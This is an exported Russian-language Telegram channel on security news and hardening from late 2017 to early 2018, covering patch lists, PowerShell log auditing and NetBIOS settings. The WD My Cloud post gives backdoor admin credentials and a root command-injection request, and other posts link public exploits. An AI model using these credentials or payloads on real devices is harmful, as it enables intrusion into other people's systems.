       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Исследователей, опубликовавших описание уязвимости BadLock, раскритиковали за чрезмерную шумиху вокруг нее, ведь она всего-то позволяет осуществить man-in-the-middle внедрение в соединение протокола SMB/CIFS. <br><br>Уязвимость заключается в недостаточном контроле уровней аутентификации в протоколах Security Account Manager (SAM) и Local Security Authority (Domain Policy) (LSAD) при установке канала по протоколу Remote Procedure Call (RPC). Все это внутри повсеместно используемого протокола SMB/CIFS. В результате атакер, имеющий доступ к трафику сессии, можешь снизить уровень аутентификации SAM и LSAD и получить доступ с правами оригинального пользователя. А еще можно вызвать DoS.<br><br>Для Windows уязвимость получила номера MS16-047 и CVE-2016-2118. Проверить ее наличие можно, например, с помощью Nessus. Или просто поискав соответствующий патч среди установленных. Это KB3149090 для Windows Vista, Server 2008, 7, Server 2008 R2, 8.1, Server 2012, Server 2012 R2, RT 8.1, KB3147461 для Windows 10 и KB 3147458 для Windows 10 Version 1511. Если вдруг понадобиться, апдейты можно скачать тут <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-047">https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-047</a>.<br><br>Сервер Samba также подвержен этой уязвимости. А именно: все версии 3.x, 4.0.x, 4.1.x, 4.2.0-10, 4.3.0-7, 4.4.0-1. Соответственно в версиях 4.2.11, 4.3.8, 4.4.2 и выше баг пофикшен.
       </div>

      </div>

     </div>

     <div class="message service" id="message-73">

      <div class="body details">
21 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message80">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="21.12.2017 11:03:34">
11:03
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Palo Alto Networks - комания, первой придумавшая понятие &quot;next-generation firewall&quot; и выпустившая соответствующие продукты. Эти &quot;межсетевые экраны&quot; на платформе PAN-OS, могут не только в фильтрацию и инспекцию, но и обнаружение угроз, поиск вредоносного ПО, идентификацию ботнетов, защиту от уязвимостей нулевого дня, блокировки веб-ресурсов, гибкие политики для разных пользователей и пр., и пр.<br><br>В этой самой PAN-OS недавно нашли возможность удаленного выполнения произвольного кода (CVE-2017-15944). CVE-2017-15944 включает в себя три уязвимости: частичный обход проверки подлинности, создание произвольных каталогов и уязвимость, предоставляющую возможность внедрения команд. Совместная эксплуатация данных проблем позволяет неаутентифицированному злоумышленнику выполнить произвольный код с привилегиями суперпользователя через веб-интерфейс в уязвимых межсетевых экранах.<br><br>Уязвимы версии до PAN-OS 6.1.18, 7.0.18, 7.1.13, 8.0.5. Исправлена уязвимость в версиях PAN-OS 6.1.19, 7.0.19, 7.1.14 и 8.0.6 и выше.<br><br>А вообще, судя по сводке уязвимостей <a href="https://securityadvisories.paloaltonetworks.com">https://securityadvisories.paloaltonetworks.com</a>, обновлять эту платформу надо регулярно.
       </div>

      </div>

     </div>

     <div class="message service" id="message-74">

      <div class="body details">
22 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message81">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="22.12.2017 12:15:11">
12:15
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Windows Hello – эксклюзивная для ОС Windows 10 функция, использующая инфракрасное изображение для аутентификации и разблокировки устройств, оснащенных камерой с инфракрасным датчиком.<br><br>Внезапно выяснилось, что ее можно обмануть с помощью простой фотографии, всего то 480 на 480 пикселей. И даже черно-белой, если заклеить камеру непрозрачной изолентой.<br><br>Microsoft выпустила патчи, исправляющие уязвимость в версиях Windows 10 1703 и 1709.
       </div>

      </div>

     </div>

     <div class="message service" id="message-75">

      <div class="body details">
25 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message82">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="25.12.2017 15:03:26">
15:03
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Huawei анонсировала новую уязвимость CVE-2017-17215.<br><br>Суть уязвимости в некорректной реализации протокола TR-064, применяемого для автоматизации настройки оборудования, в устройствах Huawei HG532. Проэксплуатировав проблему путем отправки специально сформированных пакетов на порт 37215, хакер может удаленно выполнять произвольные команды на устройстве.<br><br>Данная уязвимость активно эксплуатировалась в сети, когда еще не была пропатчена. Многие попытки эксплуатации были заблокированы CheckPoint.<br><br>На настоящий момент Huawei выпустила патч <a href="http://www.huawei.com/en/psirt/security-notices/huawei-sn-20171130-01-hg532-en">http://www.huawei.com/en/psirt/security-notices/huawei-sn-20171130-01-hg532-en</a>.<br><br>Также возможность экплуатации можно закрыть, выполнив следующие действия:<br>- включить фаервол<br>- сменить дефолтные пароли<br>- заблокировать порт 37215 фаерволом<br><br><strong>P.S. Важно!</strong> Меня не прет писать &quot;вышла уязвимость такая-то, установите обновления&quot;, хочется чего-то, что нужно делать руками. Конечно, свои планы тоже есть, но интересно узнать, о харденинге каких технологий, протоколов, софта и оборудования вы хотели бы почитать. Так что пишите, пожалуйста, пожелания на <a href="https://t.me/Li11ian">@Li11ian</a>, у меня будут целые новогодние каникулы, чтобы подготовить материал =)
       </div>

      </div>

     </div>

     <div class="message service" id="message-76">

      <div class="body details">
26 December 2017
      </div>

     </div>

     <div class="message default clearfix" id="message83">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="26.12.2017 13:06:34">
13:06
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Веб-сервер GoAhead явно не на слуху. А между тем он используется в куче девайсов Comcast, Oracle, D-Link, ZTE, HP, Siemens, Canon и других. GoAhead может работать даже на IoT-устройствах, чьи ресурсы сильно ограничены, то есть роутерах, принтерах, камерах и прочем сетевом оборудовании. И активно в них используется.<br><br>Пока все отдыхают, исследователи безопасности находят для себя дополнительное время для ресерча (ну а что им еще делать?!). И вот GoAhead как раз попал под раздачу. В нем (все версии ниже 3.6.5) обнаружена RCE уязвимость. Проблема получила идентификатор CVE-2017-17562. Баг сопряжен с работой скриптов CGI и эксплуатировать его можно лишь в том случае, если поддержка CGI включена, равно как и поддержка dynamically linked executables.<br><br>Разработчики выпустили исправленную версию, но вот беда - сервер в основном используется в составе прошивок различных устройств. И обновлять нужно версии прошивок. А делается это редко, трудно и от балды. В итоге в одном только интернете болтается 500-700 тысяч уязвимых устройств. Ждем рост ботнетов!<br><br>Еще и эксплойт (PoC) публично доступен <a href="https://github.com/elttam/advisories/blob/master/CVE-2017-17562/makemyday.py">https://github.com/elttam/advisories/blob/master/CVE-2017-17562/makemyday.py</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-77">

      <div class="body details">
9 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message84">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.01.2018 11:00:04">
11:00
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Как удачно, что критические уязвимости в архитектуре процессоров Intel, AMD и ARM опубликовали, пока мы отдыхали. Не успели мы сменить оборудование, как рекомендовал US-CERT, как оказалось, что достаточно поставить апдейты операционных систем. Ну и время на выпуск апдейтов у производителей было.<br><br>Итак, что есть в итоге на данный момент.<br><br>Уязвимости две - Meltdown («Крах») и Spectre («Призрак»). Meltdown позволяет нарушить барьер между приложениями и внутренней памятью операционной системы, что открывает доступ к данным, хранимым в памяти ОС. Подробное описание <a href="https://meltdownattack.com/meltdown.pdf">https://meltdownattack.com/meltdown.pdf</a>. Ну эксплойтики тоже есть, вот, например: <a href="https://github.com/paboldin/meltdown-exploit">https://github.com/paboldin/meltdown-exploit</a>. Spectre нарушает изоляцию памяти между самими приложениями: условно, один сервис может залезть в память другого. Описание <a href="https://spectreattack.com/spectre.pdf">https://spectreattack.com/spectre.pdf</a>. Говорят, использовать уязвимость сложнее, но сплойты все равно есть: <a href="https://github.com/crozone/SpectrePoC">https://github.com/crozone/SpectrePoC</a>, <a href="https://github.com/Eugnis/spectre-attack">https://github.com/Eugnis/spectre-attack</a>.<br><br>В общем, кошмар! Обновляться, однозначно! Страхи про 30% потери производительности на практике не оправдываются<br><br><strong>Microsoft:</strong><br><br>Windows Server 2008 R2 Service Pack 1, Windows 7 Service Pack 1 - KB4056897 или KB4056894<br>Windows Server 2012 Standard - KB4056899 или KB4056896<br>Windows 8.1, Windows Server 2012 R2 Standard - KB4056898 или KB4056895<br>Windows 10 Enterprise - KB4056893<br>Windows 10 Version 1607, Windows Server 2016, Windows 10 Mobile - KB4056890<br>Windows 10 Version 1703 - KB4056891<br>Windows 10 version 1709 - KB4056892<br><br>С установкой патча могут возникнуть проблемы из-за антивируса. Предоставлен список антивирусов, которые блокируют патч: BitDefender, Carbon Black, Cisco, CrowdStrike, Cylance, Cyren, Endgame, Fortinet, G-DATA, McAfee, Nyotron, Palo-Alto, SentinelOne, Sophos, Trend Micro, VIPRE, Webroot. Помочь решить проблему может модификация или создание следующего ключа реестра:<br>Key=&quot;HKEY_LOCAL_MACHINE&quot;Subkey=&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\QualityCompat&quot;<br>Value Name=&quot;cadca5fe-87d3-4b96-b7fb-a231484277cc&quot;<br>Type=&quot;REG_DWORD&quot;<br>Data=&quot;0x00000000&quot;<br><br>Очень коротко по производительности: тесты с обновлением Windows 10 показали уменьшение различных параметров производительности на 1-2%. Подробности: <a href="http://www.guru3d.com/articles-pages/windows-vulnerability-cpu-meltdown-patch-benchmarked.html">http://www.guru3d.com/articles-pages/windows-vulnerability-cpu-meltdown-patch-benchmarked.html</a>.<br><br><strong>Linux:</strong><br><br>Тут все просто, вам нужно ядро 4.14.12, 4.9.75 или 4.4.110. Для других веток апдейтов нет, зато в них есть куча других неисправленных уязвимостей, так что к использованию не рекомендуются.<br><br><strong>Apple:</strong><br><br>Meltdown исправлен в iOS 11.2, macOS 10.13.2 и tvOS 11.2. Для watchOS обновление не требуется.<br>Spectre, как утверждает Apple, практически доступен для эксплуатации только через JavaScript в веб-браузере, поэтому они будут обновлять Safari. Этот патч, а также патчи Spectre для осей, пока ожидаются.<br><br><strong>Google:</strong><br><br>Android с патчем от 2018-01-05 защищен.<br>В версии Chrome 64 добавлена защита от Spectre, но выпуск его назначен на 23 января. Пока, при желании, можно включить функцию Site Isolation для защиты от атаки.<br><br><strong>Firefox:</strong><br><br>Mozilla предоставил патч, защищающий от использования Spectre через браузер, - он в версии 57 фаерфокса.<br><br><strong>Cisco:</strong><br><br>Только проводит анализ и готовится выпускать патчи. Статус тут: <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180104-cpusidechannel">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180104-cpusidechannel</a><br><br><br>Помимо этого всего этого обновление BIOS тоже нужно. Ну тут уж - на сайт производителя.
       </div>

      </div>

     </div>

     <div class="message default clearfix" id="message85">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.01.2018 11:33:45">
11:33
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
У ряда пользователей с апдейтами для винды (разных) наблюдаются фатальные проблемы - она не грузится, даже в сэйф мод.<br>Если вы с этим столкнулись, тут метод лечения <a href="https://answers.microsoft.com/en-us/windows/forum/windows_7-update/stop-0x000000c4-after-installing-kb4056894-2018-01/f09a8be3-5313-40bb-9cef-727fcdd4cd56">https://answers.microsoft.com/en-us/windows/forum/windows_7-update/stop-0x000000c4-after-installing-kb4056894-2018-01/f09a8be3-5313-40bb-9cef-727fcdd4cd56</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-78">

      <div class="body details">
10 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message86">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="10.01.2018 12:36:24">
12:36
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Есть два типа людей: одни не знают, что такое фракталы, а другие уверены, что есть два типа людей: одни не знают, что такое фракталы, а другие уверены, что есть два типа людей: одни не знают, что такое фракталы, а другие уверены, что есть…<br><br>Аудит доступа к журналам аудита. Тем, кто озадачен внедрением PCI DSS, это вполне понятно. Ну и остальным может быть интересно, кто лазит по логам. Но! Это работает только если записи о событиях собираются в централизованное место хранения. А то при компрометации системы взломщик запросто может потереть все журналы.<br><br>Тут мы настроим аудит всего доступа к журналам Windows Application, Security и System. Через PowerShell:<br><br><code>$AuditUser = &quot;Everyone&quot;</code><br><code>$AuditRules = &quot;GenericAll&quot;</code><br><code>$InheritType = &quot;ContainerInherit,ObjectInherit&quot;</code><br><code>$AuditType = &quot;Success,Failure&quot;</code><br><code>$AccessRule = New-Object System.Security.AccessControl.FileSystemAuditRule($AuditUser,$AuditRules,$InheritType,&quot;None&quot;,$AuditType)</code><br><br><code>$path = &quot;$env:SystemRoot\System32\Winevt\Logs\Application.evtx&quot;</code><br><code>$ACL = Get-Acl $path</code><br><code>$ACL.AddAuditRule($AccessRule)</code><br><code>$ACL | Set-Acl $path</code><br><br><code>$path = &quot;$env:SystemRoot\System32\Winevt\Logs\Security.evtx&quot;</code><br><code>$ACL = Get-Acl $path</code><br><code>$ACL.AddAuditRule($AccessRule)</code><br><code>$ACL | Set-Acl $path</code><br><br><code>$path = &quot;$env:SystemRoot\System32\Winevt\Logs\System.evtx&quot;</code><br><code>$ACL = Get-Acl $path</code><br><code>$ACL.AddAuditRule($AccessRule)</code><br><code>$ACL | Set-Acl $path</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-79">

      <div class="body details">
11 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message87">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="11.01.2018 13:08:35">
13:08
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Ахаха! Бэкдор! Совершенно классический, откровенно наглый, не прокомментированный производителем<br><br>WD My Cloud — это персональный облачный накопитель для систематизированного хранения фотографий и видео. Ну во всяком случае производитель считает, что там должны хранить именно фотографии и видео.<br><br>И вот, логин администратора mydlinkBRionyg, пароль abc12345cba. Подходит для моделей My Cloud Gen 2, My Cloud EX2, My Cloud EX2 Ultra, My Cloud PR2100, My Cloud PR4100, My Cloud EX4, My Cloud EX2100, My Cloud EX4100, My Cloud DL2100 и My Cloud DL4100. Shodan в помощь!<br><br>Команду можно выполнить с правами рута таким запросом:<br><code>GET /cgi-bin/nas_sharing.cgi?dbg=1&amp;cmd=51&amp;user=mydlinkBRionyg&amp;passwd=YWJjMTIzNDVjYmE&amp;start=1&amp;count=1;echo+wow; HTTP/1.1</code><br><br>А еще и загрузка произвольного файла в функции /usr/local/modules/web/pages/jquery/uploader/multi_uploadify.php, веб-шелл тоже сойдет.<br><br>Ну и всякой мелочи до кучи.<br><br>Производитель как то не торопится исправлять баги, вот уже полгода как не торопится. Так что если вы счастливый обладатель такого зверька, отрубите его хотя бы от интернета. А если есть лишнее время - вот тут: <a href="http://gulftech.org/advisories/WDMyCloud%20Multiple%20Vulnerabilities/125">http://gulftech.org/advisories/WDMyCloud%20Multiple%20Vulnerabilities/125</a> подробно расписаны баги с разбором кода, так что можно исправить их самостоятельно. Но если после этой процедуры что-то перестанет работать - я не виновата =)
       </div>

      </div>

     </div>

     <div class="message service" id="message-80">

      <div class="body details">
12 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message88">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="12.01.2018 11:51:59">
11:51
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Серверы WINS давным-давно не используются, а из последних серверов Windows уже выпилены. Как клиент Windows тем не менее использует разрешение имен NetBIOS в случае чего (после просмотра файла hosts и DNS-запроса).<br><br>Есть такой ключик в реестре, который контролирует поведение запросов разрешения имен NetBIOS:<br>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\NetBT\Parameters:NodeType (REG_DWORD)<br><br>Возможные значения:<br>1,2,4,8 (b узла, p узел, m узел, h узел)<br>1 - b-node, хост отправляет широковещательные запросы;<br>2 - p-node, хост отправляет только юникастовые запросы к настроенным WINS-серверам;<br>4 - m-node, хост сначала отправляет широковещательные запросы, а потом юникастовые;<br>8 - h-node, хост сначала отправляет юникастовые запросы, а потом широковещательные.<br><br>Проблема тут вся в широковещательных запросах, на которые может ответить любой шутник из локальной сети и подменить адреса каких-нибудь важных сервисов. Делается это элементарно с помощью Responder. Поэтому избавляемся от широковещательны запросов - просто ставим значение 2, то есть p-node.<br><br>Настройка сия не входит в стандартный набор административных шаблонов винды, так что прикладываю для нее admx в целях масштабирования. Локация в групповых политиках: Конфигурация компьютера-&gt;Политики-&gt;Административные шаблоны-&gt;Сеть-&gt;DNS-клиент: NetBIOS Node Type.<br><br>Если вдруг меня читают школьники - файл .admx нужно положить в папку %SystemDrive%\Windows\PolicyDefinitions на контроллере домена, и там еще есть папочка en-US, в которую нужно пихнуть файл .adml.
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message89">

      <div class="body">

       <div class="pull_right date details" title="12.01.2018 11:52:14">
11:52
       </div>

       <div class="media_wrap clearfix">

        <div class="media clearfix pull_left media_file">

         <div class="fill pull_left">

         </div>

         <div class="body">

          <div class="title bold">
Set-NetBIOS-node-type-KB160177.zip
          </div>

          <div class="description">
Not included, change data exporting settings to download.
          </div>

          <div class="status details">
1.9 KB
          </div>

         </div>

        </div>

       </div>

      </div>

     </div>

     <div class="message service" id="message-81">

      <div class="body details">
15 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message90">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="15.01.2018 10:36:45">
10:36
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<strong>Вы еще не обновились? Так не обновляйтесь же вы никогда!</strong><br><br>aka <strong>Новая политика обновления Microsoft</strong><br><br>или <strong>Готовимся к вторничным обновлениям</strong>.<br><br>А подготовиться теперь нужно, ибо Microsoft заявила, что новые обновления не будут устанавливаться у тех, кто не поставил те злополучные патчи Meltdown и Spectre. А не поставиться они могли из-за несовместимости с антивирусом. Поэтому все изначально несовместимые антивирусы сейчас активно работают или уже поработали над обновлениями.<br><br>Статус по совместимости можно посмотреть здесь <a href="https://docs.google.com/spreadsheets/d/184wcDt9I9TUNFFbsAVLpzAtckQxYiuirADzf3cL42FQ/htmlview">https://docs.google.com/spreadsheets/d/184wcDt9I9TUNFFbsAVLpzAtckQxYiuirADzf3cL42FQ/htmlview</a><br><br>Как можно заметить, некоторые антивирусы совместимы, но требуют вручную установить тот самый знаменитый ключ в реестре:<br>Key=&quot;HKEY_LOCAL_MACHINE&quot;Subkey=&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\QualityCompat&quot;<br>Value Name=&quot;cadca5fe-87d3-4b96-b7fb-a231484277cc&quot;<br>Type=&quot;REG_DWORD&quot;<br>Data=&quot;0x00000000&quot;<br><br>Для завершения проверяем наличие критичного апдейта:<br>Windows Server 2008 R2 Service Pack 1, Windows 7 Service Pack 1 - KB4056897 или KB4056894<br>Windows Server 2012 Standard - KB4056899 или KB4056896<br>Windows 8.1, Windows Server 2012 R2 Standard - KB4056898 или KB4056895<br>Windows 10 Enterprise - KB4056893<br>Windows 10 Version 1607, Windows Server 2016, Windows 10 Mobile - KB4056890<br>Windows 10 Version 1703 - KB4056891<br>Windows 10 version 1709 - KB4056892<br><br>И если его нет, срочно запускаем обновление вручную.<br><br>Поставили - все, новые обновления будут нам приходить.
       </div>

      </div>

     </div>

     <div class="message service" id="message-82">

      <div class="body details">
16 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message91">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="16.01.2018 14:12:38">
14:12
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
PhpMyAdmin - наиболее распространенная тулза для администрирования MySQL и MariaDB через веб-интерфейс. Огромное множество сайтов, особенно на хостингах, имеют ее в своем составе.<br><br>И вот внезапно, в столь широко используемой и вроде протестированной вдоль и поперек штуке, обнаруживается CSRF!<br><br>Для тех, кто далек от веба: CSRF - провокация пользователя на отправку веб-запроса с параметрами, заданными хакером, из браузера пользователя. При этом используется сессия пользователя. А отправка запроса может происходить автоматически при заходе на контролируемую хакером страницу.<br><br>В данном конкретном случае CSRF позволяет удалить таблицы и данные из базы данных. Ну ниче, жить еще можно, если есть бэкап.<br><br>Дыра пофикшена в уже выпущенной версии 4.7.7 phpMyAdmin. Но обновились еще точно не все, так что взломщики могут пошалить с публичными сайтами.
       </div>

      </div>

     </div>

     <div class="message service" id="message-83">

      <div class="body details">
17 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message92">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="17.01.2018 13:38:30">
13:38
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Одна из малоизвестных фич майкрософтовского ворда позволяет улучшить атаки с помощью социальной инженерии.<br><br>Функция subDoc позволяет загрузить в тело документа другой документ. Этот другой документ может загружаться с удаленного ресурса. При этом может быть запрошена NTLM или LM аутентификация, которая производится прозрачно для пользователя. В итоге хакер получает доступ к хешу, по которому может побрутить парольчик пользователя. А еще и NTLM-Relay можно смастерить, если есть подходящие внешние сервисы.<br><br>Почтовые и прочие антивирусы на данный момент не отслеживают эту фичу, так как она считается легитимной. Юзер просто получает ворд-файл, открывает и вуаля! хешик утек. Никаких предупреждений.<br><br>Что можно сделать: закрыть прямой сетевой доступ для юзеров в интернет. На фаерволе, конечно. Это кстати вообще хорошая практика. Для серфинга прокси, остальное - не нужно или по ситуации.<br><br>Далее ждать, пока антивирусные компании очухаются.<br><br>Эксплойт для фичи публично доступен: <a href="https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/ms-office/subdoc-injector/subdoc_injector.py">https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/ms-office/subdoc-injector/subdoc_injector.py</a>.<br>Подробное описание атаки тут: <a href="https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/">https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/</a>.
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message93">

      <div class="body">

       <div class="pull_right date details" title="17.01.2018 13:38:45">
13:38
       </div>

       <div class="text">
Мой коллега по счастью заниматься информационной безопасностью ведет канал про методы взлома <a href="https://t.me/linkhhh">@linkhhh</a>. Предлагаю вашему вниманию и оценке =)
       </div>

      </div>

     </div>

     <div class="message service" id="message-84">

      <div class="body details">
18 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message94">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="18.01.2018 10:59:56">
10:59
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
BIND - самый распространенный из DNS-серверов. На днях анонсирована уязвимость, которая существовала в нем целых 17 лет.<br><br>Хакеры, спокойно! RCE нет) Уязвимость позволяет вызвать отказ в работе сервера, но классифицируется как уязвимость высокого уровня риска, CVSS 7,5.<br><br>Уязвимость имеет место в версиях с 9.0.0 по 9.8.x, с 9.9.0 по 9.9.11, с 9.10.0 по 9.10.6, с 9.11.0 по 9.11.2, с 9.9.3-S1 по 9.9.11-S1, с 9.10.5-S1 по 9.10.6-S1, с 9.12.0a1 по 9.12.0rc1.<br><br>Фикс уязвимости уже выпущен и включен в следующие версии:<br>9.9.11-P1<br>9.10.6-P1<br>9.11.2-P1<br>9.12.0rc2<br>9.9.11-S2<br>9.10.6-S2<br><br>Если по какой-то загадной причине вы не хотите обновлять сервер, есть запасное решение - отключить функционал DNSSEC.<br><br>Описание уязвимости: <a href="https://kb.isc.org/article/AA-01542">https://kb.isc.org/article/AA-01542</a>. Публично доступных экплойтов нет.
       </div>

      </div>

     </div>

     <div class="message service" id="message-85">

      <div class="body details">
19 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message95">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.01.2018 10:56:43">
10:56
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Вас тоже задолбало навязчивое предложение VirtualBox обновиться? А вот сейчас самое время. <br><br>Вчера Oracle выпустила плановую пачку обновлений <a href="http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html">http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html</a>. Среди прочего - апдейты для свеженьких уязвимостей VirtualBox: CVE-2018-2676, CVE-2018-2685, CVE-2018-2686, CVE-2018-2687, CVE-2018-2688, CVE-2018-2689, CVE-2018-2690, CVE-2018-2694, CVE-2018-2698, CVE-2018-2693. Уязвимости позволяют получить доступ к VirtualBox из виртуальной машины.<br><br>Уязвимости исправлены в версиях 5.1.32 и 5.2.6 VirtualBox.<br><br>Ну и для других продуктов Oracle патчи не забудьте применить =)
       </div>

      </div>

     </div>

     <div class="message service" id="message-86">

      <div class="body details">
22 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message96">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="22.01.2018 15:27:11">
15:27
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Создана магическая ссылка &quot;<a href="iabem97.github.io/chaiOS">iabem97.github.io/chaiOS</a>&quot;. При ее получении в приложении &quot;Сообщения&quot; iPhone, iPad и Mac зависают или перезагружаются.<br><br>В таком случае придется закрыть приложение и удалить переписку с данной ссылкой, чтобы оно нормально заработало.<br><br>Защититься пока можно, добавив сайт <a href="github.io">github.io</a> в запрещенные с помощью Родительского контроля. Но причины проблемы еще не полностью выяснены, и возможно появление новых ссылок.
       </div>

      </div>

     </div>

     <div class="message service" id="message-87">

      <div class="body details">
23 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message97">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="23.01.2018 11:06:46">
11:06
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Опубликована информация о неисправленной еще уязвимости в клиенте BitTorrent Transmission.<br><br>Transmission имеет клиент-серверную архитектуру, где клиентский интерфейс доступен через веб-браузер и обращается к серверной части с помощью JSON RPC запросов. Сервер доступен на порту 9091 и по умолчанию - только с локального хоста.<br><br>Для обхода этого ограничения можно использовать технику DNS rebinding: на вредоносном сайте в iframe загружать контент с доменного имени, которое разрешается по очереди в IP хакера и в <a href="127.0.0.1">127.0.0.1</a> с коротким временем жизни привязки. Таким образом будет загружен код с сайта хакера, который будет иметь доступ к HTTP-загодовкам и сможет осуществетить запросы к серверу на локальном хосте.<br><br>Далее хакер сможет изменять всякие настройки Transmission: папки назначения, скрипты по завершению загрузки (можно выполнить любую команду), выбирать загружаемые файлы.<br><br>Разработчики Transmission были оповещены в ноябре прошлого года, но до сих пор не предоставили патч. Впрочем, вроде как собираются это сделать в течение месяца.<br><br>Однако доступ к серверу Transmission хакер может получить только если не установлен пароль на доступ к нему, так что защититься можно.<br><br>Подробное описание уязвимостии и патч, предложенный исследователем: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1447">https://bugs.chromium.org/p/project-zero/issues/detail?id=1447</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-88">

      <div class="body details">
24 January 2018
      </div>

     </div>

     <div class="message default clearfix" id="message98">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="24.01.2018 11:05:29">
11:05
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
